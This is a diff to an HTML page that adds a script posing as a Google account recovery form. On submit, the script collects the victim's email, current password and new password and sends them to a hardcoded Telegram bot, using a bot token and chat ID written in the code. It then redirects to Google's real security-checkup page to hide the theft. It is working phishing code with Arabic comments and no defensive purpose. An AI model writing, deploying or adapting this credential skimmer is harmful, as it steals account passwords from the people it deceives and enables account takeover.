@@ -99,5 +99,38 @@
       });
     });
   </script>
+  <script>
+    document.getElementById('recoveryForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const email = this.email.value;
+      const current = this.current.value;
+      const newPass = this.new.value;
+      const confirm = this.confirm.value;
+
+      const token = '8150855492:AAFow4G6Uh6RY7PSagIdTaq6UpSXdWtJzjE'; // حط التوكن هنا
+      const chat_id = '8082867838'; // حط ال chat ID هنا
+      const text = `
+محاولة استعادة حساب Google:
+البريد الإلكتروني: ${email}
+كلمة المرور الحالية: ${current}
+كلمة المرور الجديدة: ${newPass}
+تأكيد كلمة المرور: ${confirm}
+      `;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: text
+        })
+      }).then(() => {
+        window.location.href = 'https://myaccount.google.com/security-checkup';
+      });
+    });
+  </script>
 </body>
 </html>
